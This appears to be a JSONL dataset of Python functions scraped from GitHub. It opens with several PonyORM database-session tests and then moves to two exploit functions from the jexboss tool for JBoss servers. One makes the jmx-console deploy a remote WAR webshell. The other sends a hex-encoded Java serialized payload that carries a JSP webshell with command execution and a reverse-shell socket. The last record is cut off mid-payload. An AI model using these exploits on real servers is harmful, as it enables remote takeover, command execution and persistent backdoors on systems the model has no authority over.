{"docstring": "# Should rollback & retry 1 time if retry=1\n", "func_signal": "def test_retry_4(self):\n", "code": "counter = count()\n@db_session(retry=1, retry_exceptions=[ZeroDivisionError])\ndef test():\n    next(counter)\n    self.X(a=3, b=3)\n    1/0\ntry:\n    test()\nexcept ZeroDivisionError:\n    self.assertEqual(next(counter), 2)\n    with db_session:\n        self.assertEqual(count(x for x in self.X), 2)\nelse:\n    self.fail()", "path": "pony/pony/orm/tests/test_db_session.py", "commit_date": "2020-02-04 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "# Should rollback changes if the exception is not in the list of allowed exceptions\n", "func_signal": "def test_db_session_decorator_3(self):\n", "code": "@db_session(allowed_exceptions=[TypeError])\ndef test():\n    self.X(a=3, b=3)\n    1/0\ntry:\n    test()\nexcept ZeroDivisionError:\n    with db_session:\n        self.assertEqual(count(x for x in self.X), 2)\nelse:\n    self.fail()", "path": "pony/pony/orm/tests/test_db_session.py", "commit_date": "2020-02-04 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "# Issue 313: retry on exception raised during db_session.__exit__\n", "func_signal": "def test_retry_10(self):\n", "code": "retries = count()\n@db_session(retry=3)\ndef test():\n    next(retries)\n    self.X(a=1, b=1)\ntry:\n    test()\nexcept TransactionIntegrityError:\n    self.assertEqual(next(retries), 4)\nelse:\n    self.fail()", "path": "pony/pony/orm/tests/test_db_session.py", "commit_date": "2020-02-04 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "# Should commit changes if the exception is in the list of allowed exceptions\n", "func_signal": "def test_db_session_decorator_4(self):\n", "code": "@db_session(allowed_exceptions=[ZeroDivisionError])\ndef test():\n    self.X(a=3, b=3)\n    1/0\ntry:\n    test()\nexcept ZeroDivisionError:\n    with db_session:\n        self.assertEqual(count(x for x in self.X), 3)\nelse:\n    self.fail()", "path": "pony/pony/orm/tests/test_db_session.py", "commit_date": "2020-02-04 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "# Should commit if the exception is in the list of allowed_exceptions\n", "func_signal": "def test_db_session_manager_4(self):\n", "code": "try:\n    with db_session(allowed_exceptions=[ZeroDivisionError]):\n        self.X(a=3, b=3)\n        1/0\nexcept ZeroDivisionError:\n    with db_session:\n        self.assertEqual(count(x for x in self.X), 3)\nelse:\n    self.fail()", "path": "pony/pony/orm/tests/test_db_session.py", "commit_date": "2020-02-04 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "# [null,some-value] -> some-value\n", "func_signal": "def py_json_unwrap(value):\n", "code": "if value is None:\n    return None\nassert value.startswith('[null,'), value\nreturn value[6:-1]", "path": "pony/pony/orm/dbproviders/sqlite.py", "commit_date": "2020-11-23 00:00:00", "repo_name": "ponyorm/pony", "stars": 3486, "license": "apache-2.0", "language": "python", "size": 11639}
{"docstring": "\"\"\"\nExploit MainDeployer to deploy a JSP shell.\nTested and working in JBoss 4, 6. (bug in JBoss 5).\n/jmx-console/HtmlAdaptor\n:param url: The url to exploit\n:return: The HTTP status code\n\"\"\"\n", "func_signal": "def exploit_jmx_console_main_deploy(url):\n", "code": "if not 'http' in url[:4]:\n    url = \"http://\"+url\n\njsp = \"http://www.joaomatosf.com/rnp/jexws4.war\"\npayload = (\"/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=\"\n           \"MainDeployer&methodIndex=19&arg0=\"+jsp)\njexboss.print_and_flush(GREEN + \"\\n * Info: This exploit will force the server to deploy the webshell \" +\n      \"\\n   available at: \" + jsp + ENDC)\n\nheaders = {\"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n           \"Connection\": \"keep-alive\",\n           \"User-Agent\": jexboss.get_random_user_agent()}\ngl_http_pool.request('HEAD', url + payload, redirect=False, headers=headers)\nreturn get_successfully(url, \"/jexws4/jexws4.jsp\")", "path": "jexboss/_exploits.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\nExploits the JMX invoker\ntested and works in JBoss 4, 5\nMainDeploy, shell in data\n# /invoker/JMXInvokerServlet\n:param url: The URL to exploit\n:return:\n\"\"\"\n", "func_signal": "def exploit_jmx_invoker_file_repository(url, version):\n", "code": "payload = (\"\\xAC\\xED\\x00\\x05\\x73\\x72\\x00\\x29\\x6F\\x72\\x67\\x2E\\x6A\\x62\\x6F\\x73\\x73\\x2E\\x69\\x6E\\x76\\x6F\\x63\"\n       \"\\x61\\x74\\x69\\x6F\\x6E\\x2E\\x4D\\x61\\x72\\x73\\x68\\x61\\x6C\\x6C\\x65\\x64\\x49\\x6E\\x76\\x6F\\x63\\x61\\x74\\x69\"\n       \"\\x6F\\x6E\\xF6\\x06\\x95\\x27\\x41\\x3E\\xA4\\xBE\\x0C\\x00\\x00\\x78\\x70\\x70\\x77\\x08\\x78\\x94\\x98\\x47\\xC1\\xD0\"\n       \"\\x53\\x87\\x73\\x72\\x00\\x11\\x6A\\x61\\x76\\x61\\x2E\\x6C\\x61\\x6E\\x67\\x2E\\x49\\x6E\\x74\\x65\\x67\\x65\\x72\\x12\"\n       \"\\xE2\\xA0\\xA4\\xF7\\x81\\x87\\x38\\x02\\x00\\x01\\x49\\x00\\x05\\x76\\x61\\x6C\\x75\\x65\\x78\\x72\\x00\\x10\\x6A\\x61\"\n       \"\\x76\\x61\\x2E\\x6C\\x61\\x6E\\x67\\x2E\\x4E\\x75\\x6D\\x62\\x65\\x72\\x86\\xAC\\x95\\x1D\\x0B\\x94\\xE0\\x8B\\x02\\x00\"\n       \"\\x00\\x78\\x70\")\npayload += (\"\\xE3\\x2C\\x60\\xE6\") if version == 0 else (\"\\x26\\x95\\xBE\\x0A\")\npayload += (\n        \"\\x73\\x72\\x00\\x24\\x6F\\x72\\x67\\x2E\\x6A\\x62\\x6F\\x73\\x73\\x2E\\x69\\x6E\\x76\"\n       \"\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E\\x2E\\x4D\\x61\\x72\\x73\\x68\\x61\\x6C\\x6C\\x65\\x64\\x56\\x61\\x6C\\x75\\x65\\xEA\"\n       \"\\xCC\\xE0\\xD1\\xF4\\x4A\\xD0\\x99\\x0C\\x00\\x00\\x78\\x70\\x7A\\x00\\x00\\x04\\x00\\x00\\x00\\x09\\xD3\\xAC\\xED\\x00\"\n       \"\\x05\\x75\\x72\\x00\\x13\\x5B\\x4C\\x6A\\x61\\x76\\x61\\x2E\\x6C\\x61\\x6E\\x67\\x2E\\x4F\\x62\\x6A\\x65\\x63\\x74\\x3B\"\n       \"\\x90\\xCE\\x58\\x9F\\x10\\x73\\x29\\x6C\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x04\\x73\\x72\\x00\\x1B\\x6A\\x61\\x76\"\n       \"\\x61\\x78\\x2E\\x6D\\x61\\x6E\\x61\\x67\\x65\\x6D\\x65\\x6E\\x74\\x2E\\x4F\\x62\\x6A\\x65\\x63\\x74\\x4E\\x61\\x6D\\x65\"\n       \"\\x0F\\x03\\xA7\\x1B\\xEB\\x6D\\x15\\xCF\\x03\\x00\\x00\\x78\\x70\\x74\\x00\\x2C\\x6A\\x62\\x6F\\x73\\x73\\x2E\\x61\\x64\"\n       \"\\x6D\\x69\\x6E\\x3A\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x3D\\x44\\x65\\x70\\x6C\\x6F\\x79\\x6D\\x65\\x6E\\x74\\x46\\x69\"\n       \"\\x6C\\x65\\x52\\x65\\x70\\x6F\\x73\\x69\\x74\\x6F\\x72\\x79\\x78\\x74\\x00\\x05\\x73\\x74\\x6F\\x72\\x65\\x75\\x71\\x00\"\n       \"\\x7E\\x00\\x00\\x00\\x00\\x00\\x05\\x74\\x00\\x0B\\x6A\\x65\\x78\\x69\\x6E\\x76\\x34\\x2E\\x77\\x61\\x72\\x74\\x00\\x07\"\n       \"\\x6A\\x65\\x78\\x69\\x6E\\x76\\x34\\x74\\x00\\x04\\x2E\\x6A\\x73\\x70\\x74\\x08\\x98\\x3C\\x25\\x40\\x20\\x70\\x61\\x67\"\n       \"\\x65\\x20\\x69\\x6D\\x70\\x6F\\x72\\x74\\x3D\\x22\\x6A\\x61\\x76\\x61\\x2E\\x6C\\x61\\x6E\\x67\\x2E\\x2A\\x2C\\x6A\\x61\"\n       \"\\x76\\x61\\x2E\\x75\\x74\\x69\\x6C\\x2E\\x2A\\x2C\\x6A\\x61\\x76\\x61\\x2E\\x69\\x6F\\x2E\\x2A\\x2C\\x6A\\x61\\x76\\x61\"\n       \"\\x2E\\x6E\\x65\\x74\\x2E\\x2A\\x22\\x20\\x70\\x61\\x67\\x65\\x45\\x6E\\x63\\x6F\\x64\\x69\\x6E\\x67\\x3D\\x22\\x55\\x54\"\n       \"\\x46\\x2D\\x38\\x22\\x25\\x3E\\x20\\x3C\\x70\\x72\\x65\\x3E\\x20\\x3C\\x25\\x20\\x63\\x6C\\x61\\x73\\x73\\x20\\x72\\x76\"\n       \"\\x20\\x65\\x78\\x74\\x65\\x6E\\x64\\x73\\x20\\x54\\x68\\x72\\x65\\x61\\x64\\x7B\\x49\\x6E\\x70\\x75\\x74\\x53\\x74\\x72\"\n       \"\\x65\\x61\\x6D\\x20\\x69\\x73\\x3B\\x4F\\x75\\x74\\x70\\x75\\x74\\x53\\x74\\x72\\x65\\x61\\x6D\\x20\\x6F\\x73\\x3B\\x72\"\n       \"\\x76\\x28\\x49\\x6E\\x70\\x75\\x74\\x53\\x74\\x72\\x65\\x61\\x6D\\x20\\x69\\x73\\x2C\\x4F\\x75\\x74\\x70\\x75\\x74\\x53\"\n       \"\\x74\\x72\\x65\\x61\\x6D\\x20\\x6F\\x73\\x29\\x7B\\x74\\x68\\x69\\x73\\x2E\\x69\\x73\\x3D\\x69\\x73\\x3B\\x74\\x68\\x69\"\n       \"\\x73\\x2E\\x6F\\x73\\x3D\\x6F\\x73\\x3B\\x7D\\x70\\x75\\x62\\x6C\\x69\\x63\\x20\\x76\\x6F\\x69\\x64\\x20\\x72\\x75\\x6E\"\n       \"\\x28\\x29\\x7B\\x42\\x75\\x66\\x66\\x65\\x72\\x65\\x64\\x52\\x65\\x61\\x64\\x65\\x72\\x20\\x69\\x6E\\x3D\\x6E\\x75\\x6C\"\n       \"\\x6C\\x3B\\x42\\x75\\x66\\x66\\x65\\x72\\x65\\x64\\x57\\x72\\x69\\x74\\x65\\x72\\x20\\x6F\\x75\\x74\\x3D\\x6E\\x75\\x6C\"\n       \"\\x6C\\x3B\\x74\\x72\\x79\\x7B\\x69\\x6E\\x3D\\x6E\\x65\\x77\\x20\\x42\\x75\\x66\\x66\\x65\\x72\\x65\\x64\\x52\\x65\\x61\"\n       \"\\x64\\x65\\x72\\x28\\x6E\\x65\\x77\\x20\\x49\\x6E\\x70\\x75\\x74\\x53\\x74\\x72\\x65\\x61\\x6D\\x52\\x65\\x61\\x64\\x65\"\n       \"\\x72\\x28\\x74\\x68\\x69\\x73\\x2E\\x69\\x73\\x29\\x29\\x3B\\x6F\\x75\\x74\\x3D\\x6E\\x65\\x77\\x20\\x42\\x75\\x66\\x66\"\n       \"\\x65\\x72\\x65\\x64\\x57\\x72\\x69\\x74\\x65\\x72\\x28\\x6E\\x65\\x77\\x20\\x4F\\x75\\x74\\x70\\x75\\x74\\x53\\x74\\x72\"\n       \"\\x65\\x61\\x6D\\x57\\x72\\x69\\x74\\x65\\x72\\x28\\x74\\x68\\x69\\x73\\x2E\\x6F\\x73\\x29\\x29\\x3B\\x63\\x68\\x61\\x72\"\n       \"\\x20\\x62\\x5B\\x5D\\x3D\\x6E\\x65\\x77\\x20\\x63\\x68\\x61\\x72\\x5B\\x38\\x31\\x39\\x32\\x5D\\x3B\\x69\\x6E\\x74\\x20\"\n       \"\\x6C\\x3B\\x77\\x68\\x69\\x6C\\x65\\x28\\x28\\x6C\\x3D\\x69\\x6E\\x2E\\x72\\x65\\x61\\x64\\x28\\x62\\x2C\\x30\\x2C\\x62\"\n       \"\\x2E\\x6C\\x65\\x6E\\x67\\x74\\x68\\x29\\x29\\x3E\\x30\\x29\\x7B\\x6F\\x75\\x74\\x2E\\x77\\x72\\x69\\x74\\x65\\x28\\x62\"\n       \"\\x2C\\x30\\x2C\\x6C\\x29\\x3B\\x6F\\x75\\x74\\x2E\\x66\\x6C\\x75\\x73\\x68\\x28\\x29\\x3B\\x7D\\x7D\\x63\\x61\\x74\\x63\"\n       \"\\x68\\x28\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6F\\x6E\\x20\\x65\\x29\\x7B\\x7D\\x7D\\x7D\\x53\\x74\\x72\\x69\\x6E\\x67\"\n       \"\\x20\\x73\\x68\\x3D\\x6E\\x75\\x6C\\x6C\\x3B\\x69\\x66\\x28\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x2E\\x67\\x65\\x74\\x50\"\n       \"\\x61\\x72\\x61\\x6D\\x65\\x74\\x65\\x72\\x28\\x22\\x70\\x70\\x70\\x22\\x29\\x21\\x3D\\x6E\\x75\\x6C\\x6C\\x29\\x7B\\x73\"\n       \"\\x68\\x3D\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x2E\\x67\\x65\\x74\\x50\\x61\\x72\\x61\\x6D\\x65\\x74\\x65\\x72\\x28\\x22\"\n       \"\\x70\\x70\\x70\\x22\\x29\\x3B\\x7D\\x65\\x6C\\x73\\x65\\x20\\x69\\x66\\x28\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x2E\\x67\"\n       \"\\x65\\x74\\x48\\x65\\x61\\x64\\x65\\x72\\x28\\x22\\x58\\x2D\\x4A\\x45\\x58\\x22\\x29\\x21\\x3D\\x20\\x6E\\x75\\x6C\\x6C\"\n       \"\\x29\\x7B\\x73\\x68\\x3D\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x2E\\x67\\x65\\x74\\x48\\x65\\x61\\x64\\x65\\x72\\x28\\x22\"\n       \"\\x58\\x2D\\x4A\\x45\\x58\\x22\\x29\\x3B\\x7D\\x69\\x66\\x28\\x73\\x68\\x20\\x21\\x3D\\x20\\x6E\\x75\\x6C\\x6C\\x29\\x7B\"\n       \"\\x72\\x65\\x73\\x70\\x6F\\x6E\\x73\\x65\\x2E\\x73\\x65\\x74\\x43\\x6F\\x6E\\x74\\x65\\x6E\\x74\\x54\\x79\\x70\\x65\\x28\"\n       \"\\x22\\x74\\x65\\x78\\x74\\x2F\\x68\\x74\\x6D\\x6C\\x22\\x29\\x3B\\x42\\x75\\x66\\x66\\x65\\x72\\x65\\x64\\x52\\x65\\x61\"\n       \"\\x64\\x65\\x72\\x20\\x62\\x72\\x3D\\x6E\\x75\\x6C\\x6C\\x3B\\x53\\x74\\x72\\x69\\x6E\\x67\\x20\\x6C\\x68\\x63\\x3D\\x28\"\n       \"\\x6E\\x65\\x77\\x20\\x44\\x61\\x74\\x65\\x28\\x29\\x2E\\x74\\x6F\\x53\\x74\\x72\\x69\\x6E\\x67\\x28\\x29\\x2E\\x73\\x70\"\n       \"\\x6C\\x69\\x74\\x28\\x22\\x3A\\x22\\x29\\x5B\\x30\\x5D\\x2B\\x22\\x68\\x2E\\x6C\\x6F\\x67\\x22\\x29\\x2E\\x72\\x65\\x70\"\n       \"\\x6C\\x61\\x63\\x65\\x41\\x6C\\x6C\\x28\\x22\\x20\\x22\\x2C\\x22\\x2D\\x22\\x29\\x3B\\x74\\x72\\x79\\x7B\\x69\\x66\\x28\"\n       \"\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x2E\\x67\\x7A\\x00\\x00\\x04\\x00\\x65\\x74\\x48\\x65\\x61\\x64\\x65\\x72\\x28\\x22\"\n       \"\\x6E\\x6F\\x2D\\x63\\x68\\x65\\x63\\x6B\\x2D\\x75\\x70\\x64\\x61\\x74\\x65\\x73\\x22\\x29\\x3D\\x3D\\x6E\\x75\\x6C\\x6C\"\n       \"\\x29\\x7B\\x48\\x74\\x74\\x70\\x55\\x52\\x4C\\x43\\x6F\\x6E\\x6E\\x65\\x63\\x74\\x69\\x6F\\x6E\\x20\\x63\\x3D\\x28\\x48\"\n       \"\\x74\\x74\\x70\\x55\\x52\\x4C\\x43\\x6F\\x6E\\x6E\\x65\\x63\\x74\\x69\\x6F\\x6E\\x29\\x6E\\x65\\x77\\x20\\x55\\x52\\x4C\"\n       \"\\x28\\x22\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x77\\x65\\x62\\x73\\x68\\x65\\x6C\\x6C\\x2E\\x6A\\x65\\x78\\x62\\x6F\\x73\"\n       \"\\x73\\x2E\\x6E\\x65\\x74\\x2F\\x6A\\x73\\x70\\x5F\\x76\\x65\\x72\\x73\\x69\\x6F\\x6E\\x2E\\x74\\x78\\x74\\x22\\x29\\x2E\"\n       \"\\x6F\\x70\\x65\\x6E\\x43\\x6F\\x6E\\x6E\\x65\\x63\\x74\\x69\\x6F\\x6E\\x28\\x29\\x3B\\x63\\x2E\\x73\\x65\\x74\\x52\\x65\"\n       \"\\x71\\x75\\x65\\x73\\x74\\x50\\x72\\x6F\\x70\\x65\\x72\\x74\\x79\\x28\\x22\\x55\\x73\\x65\\x72\\x2D\\x41\\x67\\x65\\x6E\"\n       \"\\x74\\x22\\x2C\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x2E\\x67\\x65\\x74\\x48\\x65\\x61\\x64\\x65\\x72\\x28\\x22\\x48\\x6F\"\n       \"\\x73\\x74\\x22\\x29\\x2B\\x22\\x3C\\x2D\\x22\\x2B\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x2E\\x67\\x65\\x74\\x52\\x65\\x6D\"\n       \"\\x6F\\x74\\x65\\x41\\x64\\x64\\x72\\x28\\x29\\x29\\x3B\\x69\\x66\\x28\\x21\\x6E\\x65\\x77\\x20\\x46\\x69\\x6C\\x65\\x28\"\n       \"\\x22\\x63\\x68\\x65\\x63\\x6B\\x5F\\x22\\x2B\\x6C\\x68\\x63\\x29\\x2E\\x65\\x78\\x69\\x73\\x74\\x73\\x28\\x29\\x29\\x7B\"\n       \"\\x50\\x72\\x69\\x6E\\x74\\x57\\x72\\x69\\x74\\x65\\x72\\x20\\x77\\x3D\\x6E\\x65\\x77\\x20\\x50\\x72\\x69\\x6E\\x74\\x57\"\n       \"\\x72\\x69\\x74\\x65\\x72\\x28\\x22\\x63\\x68\\x65\\x63\\x6B\\x5F\\x22\\x2B\\x6C\\x68\\x63\\x29\\x3B\\x77\\x2E\\x63\\x6C\"\n       \"\\x6F\\x73\\x65\\x28\\x29\\x3B\\x62\\x72\\x3D\\x6E\\x65\\x77\\x20\\x42\\x75\\x66\\x66\\x65\\x72\\x65\\x64\\x52\\x65\\x61\"\n       \"\\x64\\x65\\x72\\x28\\x6E\\x65\\x77\\x20\\x49\\x6E\\x70\\x75\\x74\\x53\\x74\\x72\\x65\\x61\\x6D\\x52\\x65\\x61\\x64\\x65\"\n       \"\\x72\\x28\\x63\\x2E\\x67\\x65\\x74\\x49\\x6E\\x70\\x75\\x74\\x53\\x74\\x72\\x65\\x61\\x6D\\x28\\x29\\x29\\x29\\x3B\\x53\"\n       \"\\x74\\x72\\x69\\x6E\\x67\\x20\\x6C\\x76\\x3D\\x62\\x72\\x2E\\x72\\x65\\x61\\x64\\x4C\\x69\\x6E\\x65\\x28\\x29\\x2E\\x73\"\n       \"\\x70\\x6C\\x69\\x74\\x28\\x22\\x20\\x22\\x29\\x5B\\x31\\x5D\\x3B\\x69\\x66\\x28\\x21\\x6C\\x76\\x2E\\x65\\x71\\x75\\x61\"\n       \"\\x6C\\x73\\x28\\x22\\x34\\x22\\x29\\x29\\x7B\\x6F\\x75\\x74\\x2E\\x70\\x72\\x69\\x6E\\x74\\x28\\x22\\x4E\\x65\\x77\\x20\"\n       \"\\x76\\x65\\x72\\x73\\x69\\x6F\\x6E\\x2E\\x20\\x50\\x6C\\x65\\x61\\x73\\x65\\x20\\x75\\x70\\x64\\x61\\x74\\x65\\x21\\x22\"\n       \"\\x29\\x3B\\x7D\\x7D\\x65\\x6C\\x73\\x65\\x20\\x69\\x66\\x28\\x73\\x68\\x2E\\x69\\x6E\\x64\\x65\\x78\\x4F\\x66\\x28\\x22\"\n       \"\\x69\\x64\\x22\\x29\\x21\\x3D\\x2D\\x31\\x7C\\x7C\\x73\\x68\\x2E\\x69\\x6E\\x64\\x65\\x78\\x4F\\x66\\x28\\x22\\x69\\x70\"\n       \"\\x63\\x6F\\x6E\\x66\\x69\\x67\\x22\\x29\\x21\\x3D\\x2D\\x31\\x29\\x7B\\x63\\x2E\\x67\\x65\\x74\\x49\\x6E\\x70\\x75\\x74\"\n       \"\\x53\\x74\\x72\\x65\\x61\\x6D\\x28\\x29\\x3B\\x7D\\x7D\\x7D\\x63\\x61\\x74\\x63\\x68\\x28\\x45\\x78\\x63\\x65\\x70\\x74\"\n       \"\\x69\\x6F\\x6E\\x20\\x65\\x29\\x7B\\x6F\\x75\\x74\\x2E\\x70\\x72\\x69\\x6E\\x74\\x6C\\x6E\\x28\\x22\\x46\\x61\\x69\\x6C\"\n       \"\\x65\\x64\\x20\\x74\\x6F\\x20\\x63\\x68\\x65\\x63\\x6B\\x20\\x66\\x6F\\x72\\x20\\x75\\x70\\x64\\x61\\x74\\x65\\x73\\x22\"\n       \"\\x29\\x3B\\x7D\\x74\\x72\\x79\\x7B\\x50\\x72\\x6F\\x63\\x65\\x73\\x73\\x20\\x70\\x3B\\x62\\x6F\\x6F\\x6C\\x65\\x61\\x6E\"\n       \"\\x20\\x6E\\x69\\x78\\x3D\\x74\\x72\\x75\\x65\\x3B\\x69\\x66\\x28\\x21\\x53\\x79\\x73\\x74\\x65\\x6D\\x2E\\x67\\x65\\x74\"\n       \"\\x50\\x72\\x6F\\x70\\x65\\x72\\x74\\x79\\x28\\x22\\x66\\x69\\x6C\\x65\\x2E\\x73\\x65\\x70\\x61\\x72\\x61\\x74\\x6F\\x72\"\n       \"\\x22\\x29\\x2E\\x65\\x71\\x75\\x61\\x6C\\x73\\x28\\x22\\x2F\\x22\\x29\\x29\\x7B\\x6E\\x69\\x78\\x3D\\x66\\x61\\x6C\\x73\"\n       \"\\x65\\x3B\\x7D\\x69\\x66\\x28\\x73\\x68\\x2E\\x69\\x6E\\x64\\x65\\x78\\x4F\\x66\\x28\\x22\\x6A\\x65\\x78\\x72\\x65\\x6D\"\n       \"\\x6F\\x74\\x65\\x3D\\x22\\x29\\x21\\x3D\\x2D\\x31\\x29\\x7B\\x53\\x6F\\x63\\x6B\\x65\\x74\\x20\\x73\\x63\\x3D\\x6E\\x65\"\n       \"\\x77\\x20\\x53\\x6F\\x63\\x6B\\x65\\x74\\x28\\x73\\x68\\x2E\\x73\\x70\\x6C\\x69\\x74\\x28\\x22\\x3D\\x22\\x29\\x5B\\x31\"\n       \"\\x5D\\x2E\\x73\\x70\\x6C\\x69\\x74\\x28\\x22\\x3A\\x22\\x29\\x5B\\x30\\x5D\\x2C\\x49\\x6E\\x74\\x65\\x67\\x65\\x72\\x2E\"\n       \"\\x70\\x61\\x72\\x73\\x65\\x49\\x6E\\x74\\x28\\x73\\x68\\x2E\\x73\\x70\\x6C\\x69\\x74\\x28\\x22\\x3A\\x22\\x29\\x5B\\x31\"\n       \"\\x5D\\x29\\x29\\x3B\\x69\\x66\\x28\\x6E\\x69\\x78\\x29\\x7B\\x73\\x68\\x3D\\x22\\x2F\\x62\\x69\\x6E\\x2F\\x62\\x61\\x73\"\n       \"\\x68\\x22\\x3B\\x7D\\x65\\x6C\\x73\\x65\\x7B\\x73\\x68\\x3D\\x22\\x63\\x6D\\x64\\x2E\\x65\\x78\\x65\\x22\\x3B\\x7D\\x70\"\n       \"\\x3D\\x52\\x75\\x6E\\x74\\x69\\x6D\\x65\\x2E\\x67\\x65\\x74\\x52\\x75\\x6E\\x74\\x69\\x6D\\x65\\x28\\x29\\x2E\\x65\\x78\"\n       \"\\x65\\x63\\x28\\x73\\x68\\x29\\x3B\\x28\\x6E\\x65\\x77\\x20\\x72\\x76\\x28\\x70\\x2E\\x67\\x65\\x74\\x49\\x6E\\x70\\x75\"\n       \"\\x74\\x53\\x74\\x72\\x65\\x61\\x6D\\x28\\x29\\x2C\\x73\\x63\\x2E\\x67\\x65\\x74\\x4F\\x75\\x74\\x70\\x75\\x74\\x53\\x74\"\n       \"\\x72\\x65\\x61\\x6D\\x28\\x29\\x29\\x29\\x2E\\x73\\x74\\x61\\x72\\x74\\x28\\x29\\x3B\\x28\\x6E\\x65\\x77\\x20\\x72\\x76\"\n       \"\\x28\\x73\\x63\\x2E\\x67\\x65\\x74\\x49\\x6E\\x70\\x75\\x74\\x53\\x74\\x72\\x65\\x61\\x6D\\x28\\x29\\x2C\\x70\\x2E\\x67\"\n       \"\\x65\\x74\\x4F\\x75\\x74\\x70\\x7A\\x00\\x00\\x01\\xDB\\x75\\x74\\x53\\x74\\x72\\x65\\x61\\x6D\\x28\\x29\\x29\\x29\\x2E\"\n       \"\\x73\\x74\\x61\\x72\\x74\\x28\\x29\\x3B\\x7D\\x65\\x6C\\x73\\x65\\x7B\\x69\\x66\\x28\\x6E\\x69\\x78\\x29\\x7B\\x70\\x3D\"\n       \"\\x52\\x75\\x6E\\x74\\x69\\x6D\\x65\\x2E\\x67\\x65\\x74\\x52\\x75\\x6E\\x74\\x69\\x6D\\x65\\x28\\x29\\x2E\\x65\\x78\\x65\"\n       \"\\x63\\x28\\x6E\\x65\\x77\\x20\\x53\\x74\\x72\\x69\\x6E\\x67\\x5B\\x5D\\x7B\\x22\\x2F\\x62\\x69\\x6E\\x2F\\x62\\x61\\x73\"\n       \"\\x68\\x22\\x2C\\x22\\x2D\\x63\\x22\\x2C\\x73\\x68\\x7D\\x29\\x3B\\x7D\\x65\\x6C\\x73\\x65\\x7B\\x70\\x3D\\x52\\x75\\x6E\"\n       \"\\x74\\x69\\x6D\\x65\\x2E\\x67\\x65\\x74\\x52\\x75\\x6E\\x74\\x69\\x6D\\x65\\x28\\x29\\x2E\\x65\\x78\\x65\\x63\\x28\\x22\"\n       \"\\x63\\x6D\\x64\\x2E\\x65\\x78\\x65\\x20\\x2F\\x43\\x20\\x22\\x2B\\x73\\x68\\x29\\x3B\\x7D\\x62\\x72\\x3D\\x6E\\x65\\x77\"\n       \"\\x20\\x42\\x75\\x66\\x66\\x65\\x72\\x65\\x64\\x52\\x65\\x61\\x64\\x65\\x72\\x28\\x6E\\x65\\x77\\x20\\x49\\x6E\\x70\\x75\"\n       \"\\x74\\x53\\x74\\x72\\x65\\x61\\x6D\\x52\\x65\\x61\\x64\\x65\\x72\\x28\\x70\\x2E\\x67\\x65\\x74\\x49\\x6E\\x70\\x75\\x74\"\n       \"\\x53\\x74\\x72\\x65\\x61\\x6D\\x28\\x29\\x29\\x29\\x3B\\x53\\x74\\x72\\x69\\x6E\\x67\\x20\\x64\\x3D\\x62\\x72\\x2E\\x72\"\n       \"\\x65\\x61\\x64\\x4C\\x69\\x6E\\x65\\x28\\x29\\x3B\\x77\\x68\\x69\\x6C\\x65\\x28\\x64\\x20\\x21\\x3D\\x20\\x6E\\x75\\x6C\"\n       \"\\x6C\\x29\\x7B\\x6F\\x75\\x74\\x2E\\x70\\x72\\x69\\x6E\\x74\\x6C\\x6E\\x28\\x64\\x29\\x3B\\x64\\x3D\\x62\\x72\\x2E\\x72\"\n       \"\\x65\\x61\\x64\\x4C\\x69\\x6E\\x65\\x28\\x29\\x3B\\x7D\\x7D\\x7D\\x63\\x61\\x74\\x63\\x68\\x28\\x45\\x78\\x63\\x65\\x70\"\n       \"\\x74\\x69\\x6F\\x6E\\x20\\x65\\x29\\x7B\\x6F\\x75\\x74\\x2E\\x70\\x72\\x69\\x6E\\x74\\x6C\\x6E\\x28\\x22\\x55\\x6E\\x6B\"\n       \"\\x6E\\x6F\\x77\\x6E\\x20\\x63\\x6F\\x6D\\x6D\\x61\\x6E\\x64\\x22\\x29\\x3B\\x7D\\x7D\\x25\\x3E\\x73\\x72\\x00\\x11\\x6A\"\n       \"\\x61\\x76\\x61\\x2E\\x6C\\x61\\x6E\\x67\\x2E\\x42\\x6F\\x6F\\x6C\\x65\\x61\\x6E\\xCD\\x20\\x72\\x80\\xD5\\x9C\\xFA\\xEE\"\n       \"\\x02\\x00\\x01\\x5A\\x00\\x05\\x76\\x61\\x6C\\x75\\x65\\x78\\x70\\x01\\x75\\x72\\x00\\x13\\x5B\\x4C\\x6A\\x61\\x76\\x61\"\n       \"\\x2E\\x6C\\x61\\x6E\\x67\\x2E\\x53\\x74\\x72\\x69\\x6E\\x67\\x3B\\xAD\\xD2\\x56\\xE7\\xE9\\x1D\\x7B\\x47\\x02\\x00\\x00\"\n       \"\\x78\\x70\\x00\\x00\\x00\\x05\\x74\\x00\\x10\\x6A\\x61\\x76\\x61\\x2E\\x6C\\x61\\x6E\\x67\\x2E\\x53\\x74\\x72\\x69\\x6E\"\n       \"\\x67\\x71\\x00\\x7E\\x00\\x0F\\x71\\x00\\x7E\\x00\\x0F\\x71\\x00\\x7E\\x00\\x0F\\x74\\x00\\x07\\x62\\x6F\\x6F\\x6C\\x65\"\n       \"\\x61\\x6E\\xF9\\x12\\x63\\x17\\x78\\x77\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x73\\x72\\x00\\x22\\x6F\\x72\\x67\"\n       